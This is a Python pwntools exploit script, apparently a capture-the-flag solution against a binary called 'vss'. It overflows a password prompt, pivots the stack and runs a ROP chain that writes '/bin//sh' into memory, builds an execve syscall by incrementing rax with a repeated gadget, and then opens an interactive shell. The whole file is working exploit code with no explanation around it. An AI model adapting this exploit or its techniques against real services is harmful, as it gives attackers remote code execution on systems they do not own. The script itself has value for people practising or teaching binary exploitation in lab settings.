from pwn import *
from struct import pack
io = remote("127.0.0.1",9998)
#io = process("./vss_72e30bb98bdfbf22307133c16f8c9966")
#0x000000000046f205 : add rsp, 0x58 ; ret
#0x000000000045f2a5 : syscall ; ret

p = ''
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x000000000046f208) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045f2a5) # syscall ; ret



io.recvuntil("word:\n")
payload = ''
payload += "py" + 'a' * 0x46 + p64(0x46f205) + (0x58 - 0x50) * 'a' + p
io.sendline(payload)

io.interactive()
# Padding goes here

